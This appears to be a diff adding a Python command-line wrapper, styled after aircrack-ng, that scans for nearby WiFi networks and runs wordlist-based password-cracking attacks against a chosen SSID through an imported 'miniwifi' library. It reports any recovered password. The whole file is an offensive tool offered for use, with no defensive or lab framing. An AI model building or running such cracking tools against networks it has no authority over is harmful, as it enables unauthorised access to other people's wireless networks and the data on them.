@@ -1,0 +1,76 @@
+#!/usr/bin/python3
+import argparse
+import sys
+from miniwifi import WifiScanner, WifiCracker
+from colorama import Fore, Style, init
+import os
+
+init(autoreset=True)
+
+def display_networks(networks):
+    print(f"\n{Fore.CYAN}[{Fore.YELLOW}*{Fore.CYAN}] Available Networks:")
+    for i, ssid in enumerate(networks, 1):
+        print(f"{Fore.WHITE}[{Fore.GREEN}{i}{Fore.WHITE}]{Fore.GREEN} {ssid}")
+
+def list_ssids():
+    scanner = WifiScanner()
+    networks = scanner.scan_networks()
+    if networks:
+        display_networks(networks)
+    else:
+        print(f"{Fore.RED}[{Fore.WHITE}!{Fore.RED}] No networks found.")
+
+def crack_password(ssid, wordlist):
+    cracker = WifiCracker()
+    print(f"\n{Fore.MAGENTA}[{Fore.YELLOW}*{Fore.MAGENTA}] Cracking {ssid} with {wordlist}...")
+
+    try:
+        result = cracker.crack(ssid, wordlist)
+
+        if result['success']:
+            print(f"\n{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] SUCCESS! Password: {Fore.WHITE}{result['password']}")
+        else:
+            print(f"\n{Fore.RED}[{Fore.WHITE}!{Fore.RED}] Password not found in wordlist")
+
+        print(f"{Fore.BLUE}[{Fore.YELLOW}i{Fore.BLUE}] Attempts: {Fore.WHITE}{result['attempt']} | Time: {Fore.WHITE}{result['elapsed']:.2f}s")
+        return result['success']
+    except KeyboardInterrupt:
+        print(f"\n{Fore.RED}[{Fore.WHITE}!{Fore.RED}] Operation cancelled by user")
+        sys.exit(1)
+    except Exception as e:
+        print(f"{Fore.RED}[{Fore.WHITE}!{Fore.RED}] Error: {Fore.WHITE}{str(e)}")
+        return False
+
+def crack_multiple(ssid, wordlists):
+    for wordlist in wordlists:
+        if not os.path.exists(wordlist):
+            print(f"{Fore.RED}[{Fore.WHITE}!{Fore.RED}] File not found: {wordlist}")
+            continue
+
+        success = crack_password(ssid, wordlist)
+        if success:
+            break
+
+def main():
+    parser = argparse.ArgumentParser(
+        description=f"{Fore.YELLOW}WiFi Cracking Utility (Inspired by aircrack-ng)"
+    )
+    parser.add_argument('--ssid-list', action='store_true', help='List all available SSIDs')
+    parser.add_argument('--ssid', type=str, help='SSID to crack')
+    parser.add_argument('--pass', dest='wordlist', type=str, help='Path to password wordlist')
+    parser.add_argument('--pass-mul', nargs='+', dest='wordlists', help='Multiple wordlist files')
+
+    args = parser.parse_args()
+
+    if args.ssid_list:
+        list_ssids()
+    elif args.ssid and args.wordlist:
+        crack_password(args.ssid, args.wordlist)
+    elif args.ssid and args.wordlists:
+        crack_multiple(args.ssid, args.wordlists)
+    else:
+        parser.print_help()
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
